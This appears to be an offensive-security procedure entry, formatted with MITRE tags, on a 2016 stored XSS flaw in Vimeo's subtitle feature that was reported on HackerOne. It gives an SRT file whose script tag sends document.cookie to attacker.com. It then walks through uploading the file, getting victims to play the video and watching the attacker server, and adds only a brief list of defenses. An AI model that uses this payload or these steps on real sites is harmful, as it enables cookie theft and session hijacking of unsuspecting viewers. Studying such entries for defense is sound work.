---
tags:
  - xss
  - injection
  - subtitles
  - vimeo
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:47.204Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 862b4ba6-3806-4afd-ae9f-60a15e04f4ef
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-Subtitles-for-XSS

## Summary

This procedure exploits insufficient input sanitization in Vimeo's subtitles feature for the Flash Player and Hubnut components, allowing injection of arbitrary JavaScript. It enables attackers to execute client-side scripts when victims view affected videos, facilitating attacks like cookie theft or session hijacking.

## Description

The vulnerability stems from Vimeo's failure to properly sanitize or validate subtitle content during processing in the Flash Player and Hubnut. Attackers with access to upload or edit subtitles can embed HTML/JavaScript payloads in subtitle files (e.g., SRT format). Upon video playback, these payloads render and execute in the viewer's browser context. This was reported on HackerOne (Report #137023) and impacts users viewing videos on Vimeo's platform circa 2016. Prerequisites include a Vimeo account with subtitle editing rights and knowledge of the target video.

## Requirements

1. Valid Vimeo credentials with permission to upload/edit subtitles on a target video
2. Access to a text editor for crafting subtitle files (e.g., SRT with embedded script)
3. Attacker-controlled server for data exfiltration (optional, for payload testing)

## Defense

Defensive measures and detection strategies:

- Implement strict Content Security Policy (CSP) to block inline scripts
- Sanitize all subtitle inputs using HTML entity encoding and script tag stripping
- Monitor for anomalous subtitle uploads and validate file contents server-side
- Educate users on avoiding untrusted video sources

## Objectives

1. Inject and persist malicious JavaScript in subtitle content
2. Execute the payload in victim browsers during video playback
3. Steal sensitive data like session cookies or perform other client-side actions

## Instructions

### Step 1: Prepare Malicious Subtitle Payload

**Context**: Craft an SRT subtitle file embedding an XSS payload that evades basic filtering, such as placing a script tag within subtitle text.

No specific command required; use a text editor to create an SRT file like:

```
1
00:00:01,000 --> 00:00:05,000
<script>fetch('http://attacker.com/log?data='+encodeURIComponent(document.cookie));</script>
```

> This creates a subtitle line that, when loaded, injects and executes the script to exfiltrate cookies.

### Step 2: Upload Subtitles to Target Video

**Context**: Use Vimeo's web interface to associate the malicious SRT with a video, triggering the vulnerability in Flash Player or Hubnut.

Log in to Vimeo, select the target video, navigate to "Subtitles" in settings, and upload the prepared SRT file. Save changes.

> Successful upload indicates the payload is stored without sanitization. Verify by previewing the video in an affected browser.

### Step 3: Distribute and Trigger

**Context**: Share the video to induce victim playback, executing the payload.

Embed or link the video on a site/email. When viewed, subtitles load, and the script runs.

> Monitor attacker server for incoming requests confirming execution.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- vimeo
- subtitles
